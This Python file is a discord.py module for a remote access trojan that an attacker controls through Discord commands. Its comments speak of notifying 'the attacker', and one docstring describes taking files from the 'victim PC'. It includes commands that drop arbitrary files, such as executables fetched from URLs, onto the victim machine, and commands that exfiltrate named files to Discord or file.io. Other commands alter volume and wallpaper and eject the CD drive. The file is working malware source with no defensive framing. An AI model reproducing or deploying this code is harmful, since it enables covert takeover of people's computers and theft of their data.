import getpass
import os
import platform
import pwd
import re
import socket
import textwrap
import uuid
from datetime import datetime
from PIL import ImageGrab
from functools import partial
import discord
import psutil
import requests
import pyautogui
import cv2
import asyncio
import time
import random
import string
import webbrowser
from discord.ext import commands


import subprocess


class Others(commands.Cog, description="System Information"):

    def __init__(self, client: commands.Bot):
        self.client = client

    def run_system_command(command: list, show: bool = True):
        p = subprocess.run(command, capture_output=True, text=True)
        code, out, err = p.returncode, p.stdout, p.stderr
        if show:
            print(out or err)
        return code, out, err

    @commands.command()
    async def volume(self, ctx, value, mode="+"):
        """
        If target is Windows:
            Usage:
                >volume <mode>

            Examples:
                >volume +
                >volume increase

            Parameters:
                <mode>
                    +
                    p
                    plus
                    i
                    inc
                    increase
                    a
                    add

        If target is NOT Windows (Linux):
            Usage:
                >volume <value>

            Example:
                >volume 30

            Parameters:
                <value>
                    0...100
        """
        try:
            if os.name == 'nt':
                # Handle imports properly
                # Install if ImportError
                try:
                    try:
                        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    except:
                        os.system("py -m pip install -U pycaw")
                    try:
                        from comtypes import CLSCTX_ALL
                    except:
                        os.system("py -m pip install -U comtypes")
                    try:
                        from ctypes import POINTER, cast
                    except:
                        os.system("py -m pip install -U ctypes")
                finally:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    from comtypes import CLSCTX_ALL
                    from ctypes import POINTER, cast

                # Increase the volume
                if value in ("+", "p", "i", "inc", "increase", "add", "a", "plus") or mode in ("+", "p", "i", "inc", "increase", "add", "a", "plus"):
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(
                        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute(0, None)
                    volume.SetMasterVolumeLevel(
                        volume.GetVolumeRange()[1], None)
                    custom_desc = "Increased Volume"

                # Decrease the volume
                else:
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(
                        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevel(
                        volume.GetVolumeRange()[0], None)
                    custom_desc = "Decreased Volume"

                # Notify the attacker
                embed = discord.Embed(
                    title=f"Volume Control",
                    description=custom_desc,
                    timestamp=datetime.utcnow(),
                    color=0xFF5733
                )
                embed.set_footer(
                    text=f'Requested by {ctx.author.name}',
                    icon_url=ctx.author.avatar_url
                )
                await ctx.send(embed=embed)

            else:
                try:
                    # Run a system command
                    subprocess.Popen(["amixer", "-D", "pulse", "sset",
                                      "Master", str(value) + "%"], stdout=subprocess.PIPE)
                except:
                    # Set volume with a python3 library
                    # Import library. Install if error
                    try:
                        import alsaaudio as audio
                    except:
                        os.system("python3 -m pip install -U pyalsaaudio")
                    mixer = audio.Mixer('Headphone', cardindex=1)
                    mixer.setvolume(int(value))

                # Notify the attacker
                embed = discord.Embed(
                    title=f"Volume Control",
                    description=f"Set volume to {value}",
                    timestamp=datetime.utcnow(),
                    color=0xFF5733
                )
                embed.set_footer(
                    text=f'Requested by {ctx.author.name}',
                    icon_url=ctx.author.avatar_url
                )
                await ctx.send(embed=embed)

        except Exception as e:
            await ctx.send(str(e))
            return

    @commands.command()
    async def wallpaper(self, ctx, url):
        """
        Usage:
            >wallpaper <url>
        Examples:
            >wallpaper http://direct.image.link/image.png

        Parameters:
            <url>
                A direct link the Wallpaper-Image URL
        """
        try:
            if os.name == 'nt':
                try:
                    import ctypes
                except ImportError:
                    os.system("py -m pip install -U ctypes")
                finally:
                    import ctypes

                # Get the image from the link
                img_r = requests.get(str(url))
                if not 300 > img_r.status_code >= 200:
                    return await ctx.send("Error: Invalid image URL. Bad status code")
                img_path = "temp.jpg"
                with open(img_path, "wb") as file:
                    file.write(img_r.content)

                # Change the wallpaper
                ctypes.windll.user32.SystemParametersInfoW(
                    20, 0, img_path, 0)

                # Notify the attacker
                embed = discord.Embed(
                    title=f"Changed Wallpaper",
                    description="",
                    timestamp=datetime.utcnow(),
                    color=0xFF5733
                )
                embed.set_image(url=url)
                embed.set_footer(
                    text=f'Requested by {ctx.author.name}',
                    icon_url=ctx.author.avatar_url
                )
                await ctx.send(embed=embed)

            else:
                """
                Code extracted from:
                    https://gist.github.com/mtrovo/1110370#file-set_wallpaper-py
                """

                # Get the image from the link
                img_r = requests.get(str(url))
                if not 300 > img_r.status_code >= 200:
                    return await ctx.send("Error: Invalid image URL. Bad status code")
                img_path = "temp.jpg"
                with open(img_path, "wb") as file:
                    file.write(img_r.content)

                # Run a command to change the wallpaper and get the status
                command = "gconftool-2 --set \
                        /desktop/gnome/background/picture_filename \
                        --type string '%s'" % img_path
                status, output = commands.getstatusoutput(command)

                # Notify the attacker
                embed = discord.Embed(
                    title=f"Wallpaper Control",
                    description=f"Status: {status}",
                    timestamp=datetime.utcnow(),
                    color=0xFF5733
                )
                embed.set_image(url=url)
                embed.set_footer(
                    text=f'Requested by {ctx.author.name}',
                    icon_url=ctx.author.avatar_url
                )
                await ctx.send(embed=embed)

        except Exception as e:
            await ctx.send(str(e))
            return

    @commands.command()
    async def upload(self, ctx, *urls):
        """
        Usage:
            >upload <*urls>

            (attacthments can also be saved)

        Examples:
            >upload http://upload.com/file.exe http://upload.net/image.png http://upload.xyz/office.csv

        Parameters:
            <*urls>
                Direct links the the files
        """
        try:

            all_files_amount = 0
            working_files_amount = 0
            errored_files_amount = 0
            all_errors_list = ""

            # Get the file from the link
            for url in urls:
                all_files_amount += 1

                img_r = requests.get(str(url))
                if not 300 > img_r.status_code >= 200:
                    errored_files_amount += 1
                    all_errors_list += f"**{all_files_amount}**: `Bad Status Code for URL`"
                    continue

                img_path = url.split("/")[-1]  # auto file name
                with open(img_path, "wb") as file:
                    file.write(img_r.content)

                working_files_amount += 1

            # Save files from attatchments
            for attacthment in ctx.message.attachments:
                all_files_amount += 1
                try:
                    await attacthment.save()
                    working_files_amount += 1
                except Exception as e:
                    all_errors_list += f"**{all_files_amount}**: `{e}`"
                    errored_files_amount += 1

            final_description = f'''All Files: `{all_files_amount}`
Saved: `{working_files_amount}`
Errored: `{errored_files_amount}`

Errors List:
{all_errors_list}'''

            # Notify the attacker
            embed = discord.Embed(
                title=f"Downloading Files to {getpass.getuser()}'s computer",
                description=final_description,
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        except Exception as e:
            await ctx.send(str(e))
            return

    @commands.command()
    async def download(self, ctx, filename):
        """
        Usage:
            >download <filename>

        Examples:
            >download officeWork5.docx

        Parameters:
            <filename>
                Filename to download to attacker PC from victim PC
        """
        try:

            file_size = os.stat(filename).st_size
            if file_size > 7340032:
                await ctx.send("Update: The file is over 8MB. Uploading may take some time!")
                with open(filename, "rb") as file:
                    response = requests.post(
                        'https://file.io/', files={"file": file})
                    if not 300 > response.status_code >= 200:
                        await ctx.send("Error: Bad Response from `file.io` API")
                    file_url = response.json()["link"]

                embed = discord.Embed(
                    title=f"Get Files from {getpass.getuser()}'s computer",
                    description=f"**LINK**: {file_url}",
                    timestamp=datetime.utcnow(),
                    color=0xFF5733
                )
                embed.set_footer(
                    text=f'Requested by {ctx.author.name}',
                    icon_url=ctx.author.avatar_url
                )
                await ctx.send(embed=embed)
            else:
                file = discord.File(filename, filename=filename)
                await ctx.send(f"Uploaded {filename}", file=file)

        except Exception as e:
            await ctx.send(str(e))
            return

    @commands.command()
    async def compact_disk(self, ctx, com="eject"):
        """
        Usage:
            >cd <command>

        Example:
            >cd eject

        Paramaters:
            <command>
                eject | e | ej | o | open
                retract | r | re | c | close
        """
        # try:
        if os.name == 'nt':
            import ctypes
            if com.lower() in ("e", "ej", "o", "open", "eject"):
                ctypes.windll.WINMM.mciSendStringW(
                    u'set cdaudio door open', None, 0, None)
                description = "Ejected the CD Drive"
            else:
                ctypes.windll.WINMM.mciSendStringW(
                    u'set cdaudio door closed', None, 0, None)
                description = "Retracted the CD Drive"

            embed = discord.Embed(
                title=f"{getpass.getuser()}'s computer",
                description=description,
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        else:
            """
            Code taken from:
                https://askubuntu.com/questions/226638/how-to-eject-a-cd-dvd-from-the-command-line
            """
            if com.lower() in ("e", "ej", "o", "open", "eject"):
                code, out, err = self.run_system_command(["eject"])
            else:
                code, out, err = self.run_system_command(["eject", "-T"])

            embed = discord.Embed(
                title=f"CD Drive Control",
                description=f"Return Code: {code}\nOutput: ```{out or err}```",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        # except Exception as e:
        #     await ctx.send(str(e))
        #     return


def setup(client: commands.Bot):
    client.add_cog(Others(client))
